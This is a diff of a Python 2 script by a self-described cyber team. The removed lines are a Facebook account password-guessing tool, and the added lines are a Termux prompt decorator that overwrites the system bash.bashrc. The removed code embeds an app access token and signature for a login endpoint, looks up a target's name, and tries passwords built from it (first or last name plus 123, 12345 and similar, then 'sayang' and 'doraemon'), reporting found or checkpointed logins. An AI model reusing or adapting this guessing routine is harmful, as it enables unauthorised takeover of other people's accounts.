@@ -1,157 +1,359 @@
+# -*- coding: UTF-8 -*-
+# Author: Nicoleus Sitorus
+# Team: Batak Cyber Team
+
 import os
 import sys
 import time
-import json
-import urllib
-import requests
-try:
-except ImportError:
-        os.system("pip2 install requests")
-
-def login():
-        try:
-                token = open("token.txt", "r")
-        
-        except IOError:
-                print
-                print "================================"
-                user_name = raw_input(" Masukkan Username: ")
-                password = raw_input(" Masukkan Password: ")
-                print "================================"
-                urldev = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_name+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                dev = urldev.content
-                jsl = json.loads(dev)
-                if "session_key" in dev:
-                        print " Login sukses..."
-                        open("token.txt", "w").write(jsl["access_token"])
-                        brutefor()
-
-                elif "www.facebook.com" in jsl["error_msg"]:
-                        print " Akun Kena Cekpoint..."
-
-                else:
-                        print " Login gagal..."
-                        
-        else:
-                brutefor()
-                
 
 
-def brutefor():
-        try:
-                token = open("token.txt", "r").read()
-
-        except IOError:
-                os.system("rm -f token.txt")
-
-        else:
-                print
-                print " ======================================"
-                target = raw_input(" [#] Masukan ID Target: ")
-                print " ======================================"
-                urldev = requests.get('https://graph.facebook.com/' + target + '?access_token=' + token)
-                jsl = json.loads(urldev.text)
-
-                pas1 = jsl["first_name"] + "123"
-                print " [+] " + pas1
-                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pas1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                js = json.load(dev)
-                if "access_token" in js:
-                        print " Found : " + pas1
-                elif "www.facebook" in js["error_msg"]:
-                        print " Cekpoint : " + pas1
-                else:
-                        pas2 = jsl["first_name"] + "12345"
-                        print " [+] " + pas2
-                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pas2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                        js = json.load(dev)
-                        if "access_token" in js:
-                                print " Found : " + pas2
-                        elif "www.facebook.com" in js["error_msg"]:
-                                print " Cekpoint :" + pas2
-                        else:
-                                san3 = jsl["first_name"] + "321"
-                                print " [+] " + san3
-                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                js = json.load(dev)
-                                if "access_token" in js:
-                                        print " Found : " + san3
-                                elif "www.facebook.com" in js["error_msg"]:
-                                        print " Cekpoint : " + san3
-                                else:
-                                        san4 = jsl["first_name"] + "54321"
-                                        print " [+] " + san4
-                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                        js = json.load(dev)
-                                        if "access_token" in js:
-                                                print " Found : " + san4
-                                        elif "www.facebook.com" in js["error_msg"]:
-                                                print " Cekpoint : " + san4
-                                        else:
-                                                san5 = jsl["last_name"] + "123"
-                                                print " [+] " + san5
-                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                js = json.load(dev)
-                                                if "access_token" in js:
-                                                        print " Found : " + san5
-                                                elif "www.facebook.com" in js["error_msg"]:
-                                                        print " Cekpoint : " + san5
-                                                else:
-                                                        san6 = jsl["last_name"] + "12345"
-                                                        print " [+] " + san6
-                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                        js = json.load(dev)
-                                                        if "access_token" in js:
-                                                                print "  Found : " + san6
-                                                        elif "www.facebook.com" in js["error_msg"]:
-                                                                print "  Cekpoint : " + san6
-                                                        else:
-                                                                san7 = jsl["last_name"] + "321"
-                                                                print " [+] " + san7
-                                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                                js = json.load(dev)
-                                                                if "access_token" in js:
-                                                                        print "  Found : " + san7
-                                                                elif "www.facebook.com" in js["error_msg"]:
-                                                                        print "  Cekpoint : " + san7
-                                                                else:
-                                                                        san8 = jsl["last_name"] + "54321"
-                                                                        print " [+] " + san8
-                                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                                        js = json.load(dev)
-                                                                        if "access_token" in js:
-                                                                                print "  Found : " + san8
-                                                                        elif "www.facebook.com" in js["error_msg"]:
-                                                                                print "  Cekpoint : " + san8
-                                                                        else:
-                                                                                san9 = "sayang"
-                                                                                print " [+] " + san9
-                                                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                                                js = json.load(dev)
-                                                                                if "access_token" in js:
-                                                                                        print "  Found : " + san9
-                                                                                elif "www.facebook.com" in js["error_msg"]:
-                                                                                        print "  Cekpoint : " + san9
-                                                                                else:
-                                                                                        san10 = "doraemon"
-                                                                                        print " [+] " + san10
-                                                                                        dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                                                                        js = json.load(dev)
-                                                                                        if "access_token" in js:
-                                                                                                print "  Found : " + san10
-                                                                                        elif "www.facebook.com" in js["error_msg"]:
-                                                                                                print "  Cekpoint : " + san10
-                                                                                        else:
-                                                                                                print 
-                                                                                                print "  Gagalll..."
-                                                                                                print " ==============================="
-
-                                                                        
+# warna
+d = "\033[90;1m"
+m = "\033[91;1m"
+h = "\033[92;1m"
+k = "\033[93;1m"
+b = "\033[94;1m"
+p = "\033[95;1m"
+a = "\033[96;1m"
+s = "\033[97;1m"
 
 
+def runntxt(noob):
+    for lol in noob + '\n':
+        sys.stdout.write(lol)
+        sys.stdout.flush()
+        time.sleep(10. / 600)
+def banner():
+    os.system("clear")
+    os.system("toilet -f standard 'Trmx Style' -F gay")
+#    print m+"+--------------------------------------+"
+    os.system("echo '|  Author: Nicoleus Sitorus' | lolcat")
+    os.system("echo '|  Team: Batak Cyber Team' | lolcat")
+    os.system("echo '|  YOUTUBE: adysitorusady' | lolcat")
+    os.system("echo '|  Facebook: Nicoleus Sitorus' | lolcat")
+    print m+"+------------------------------------------------+ "
+    print h+"   [\033[97m1\033[92m] \033[96mEyes Gay",h+"      [\033[97m6\033[92m] \033[96mName Lolcat"
+    print h+"   [\033[97m2\033[92m] \033[96mEyes Lolcat",h+"   [\033[97m7\033[92m] \033[96mName Gay"
+    print h+"   [\033[97m3\033[92m] \033[96mTrain Lolcat",h+"  [\033[97m8\033[92m] \033[96mNeofetch Lolcat"
+    print h+"   [\033[97m4\033[92m] \033[96mTrain Gay",h+"     [\033[97m9\033[92m] \033[96mNeofetch Gay"
+    print " "
+    print m+"   [\033[93m5\033[91m] \033[97mInstall Paketnya Dulu Lae..!"
+    print m+"+------------------------------------------------+ "
+def pilih():
+  try:
+ 
+    print k+"╭────\033[92m[ \033[96mPilih Opsinya Lae.! \033[92m]"
+    pil = raw_input("\033[93m╰────➲\033[97m ")
+    if pil in ['1'] or pil == 'gay':
+        eyes_gay()
+    elif pil in ['2'] or pil == 'lolcat':
+        eyes_lolcat()
+    elif pil in ['3'] or pil == 'train lolcat':
+        train_lolcat()
+    elif pil in ['4'] or pil == 'train gay':
+        train_gay()
+    elif pil in ['5'] or pil == 'install':
+        install()
+    elif pil in ['6'] or pil == 'name lolcat':
+        name_lolcat()
+    elif pil in ['7'] or pil == 'name gay':
+        name_gay()
+    elif pil in ['8'] or pil == 'neofetch lol':
+        neofetch_lol()
+    elif pil in ['9'] or pil == 'neofetch gay':
+        neofetch_gay()
+    else:
+        print m+'pilih yg bener Lae...'
+        glob()
+  
+  except KeyboardInterrupt:
+    print d+"Keluar dari program Lae..."
+    sys.exit()  
+''' 
+  except NameError Lae:
+    print "pilih Lae.."
+    glob()
+  except SyntaxError:
+    print " Masukkan pilihannya Lae.."
+    glob()
 
+'''
 def main():
-        login()
+    banner()
+    pilih()
+def glob():
+    pilih()
 
-if __name__=="__main__":
-        main()
+def install():
+    os.system("pkg install ruby cowsay toilet figlet sl")
+    os.system("pkg install neofetch")
+    os.system("gem install lolcat")
+    main()
+def eyes_lolcat():
+    os.system("clear")
+    os.system("cowsay -f eyes 'EyesLolcat' | lolcat")
+    os.system("toilet -f standard 'Eyes Lolcat' | lolcat")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ncowsay -f eyes '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("cowsay -f eyes ' Eyes Lolcat' | lolcat")
+    os.system("toilet -f standard 'Eyes Lolcat' | lolcat")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+   
+def eyes_gay():
+    os.system('clear')
+    os.system("cowsay -f eyes 'EyesGay' | lolcat")
+    os.system("toilet -f standard ' Eyes Gay' -F gay")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ncowsay -f eyes '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' -F gay")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system('clear')
+    os.system('clear')
+    os.system("cowsay -f eyes 'Cowsay' | lolcat")
+    os.system("toilet -f standard '   Eyes Gay' -F gay")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+
+def train_lolcat():
+    os.system('clear')
+    os.system("sl")
+    os.system("toilet -f standard 'TrainLolcat' | lolcat")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\nsl")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("sl")
+    os.system("toilet -f standard 'TrainLolcat' | lolcat")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+
+def train_gay():
+    os.system('clear')
+    os.system("sl")
+    os.system("toilet -f standard '  Train Gay' -F gay")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\nsl")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' -F gay")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("sl")
+    os.system("toilet -f standard '  Train Gay' -F gay")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E* ✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+
+def name_lolcat():
+    os.system('clear')   
+    os.system("toilet -f standard 'NameLolcat' | lolcat")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("toilet -f standard 'NameLolcat' | lolcat")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+
+def name_gay():
+    os.system('clear')
+    os.system("toilet -f standard '  Name Gay' -F gay")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' -F gay")
+    iqbalz.write("\necho ' User: "+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("toilet -f standard '  Name Gay' -F gay")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+
+def neofetch_lol():
+    os.system('clear')
+    os.system("toilet -f standard '      Neof Lol' | lolcat")
+    os.system("neofetch")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' | lolcat")
+    iqbalz.write("\nneofetch")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("neofetch")
+    os.system("toilet -f standard '      Neof Lol' | lolcat")
+    os.system("echo '            Powered By: Iqbalz Noobs' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S ✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru ✓")
+    print " "
+
+
+def neofetch_gay():   
+    os.system('clear')
+    os.system("toilet -f standard '     Neof Gay' -F gay")                 
+    os.system("neofetch")
+    print a+"+---------------------------+",k+" "
+    name = str(raw_input(' [?]\033[97m Nama Pengguna:\033[92m '))
+    print a+"+---------------------------+",h+" "
+    prompt = str(raw_input(' [?]\033[95m Nama Prompt:\033[93m '))
+    print a+"+------------------------+"
+    print d+" Loading......"
+    time.sleep(1.5)      
+    iqbalz = open("bash.bashrc", "w")
+    iqbalz.write("PS1='")
+    iqbalz.write("\n\e[0;32m╭────\e[0;31m[\e[0m root\e[0;32m⚔\e[0m"+prompt+"#\e[0;33m \w \e[0;31m]\e[0;32m")
+    iqbalz.write("\n╰────➲ '")
+    iqbalz.write("\nclear")
+    iqbalz.write("\ntoilet -f standard '"+name)
+    iqbalz.write("' -F gay")
+    iqbalz.write("\nneofetch")
+    iqbalz.write("\ndate | lolcat")
+    iqbalz.close()
+    os.system("rm $HOME/../usr/etc/bash.bashrc")
+    os.system("cp -f bash.bashrc $HOME/../usr/etc")
+    os.system("clear")
+    os.system("neofetch")
+    os.system("toilet -f standard '     Neof Gay' -F gay")
+    os.system("echo '            Powered By: Nicoleus Sitorus' | lolcat ")
+    print ' '
+    runntxt(a+"                √  S U C C E S *L A E*✓")
+    runntxt(h+"          ✓  Silahkan Buka Sesi Baru Lae✓")
+    print " "
+
+if __name__=='__main__':
+    main()
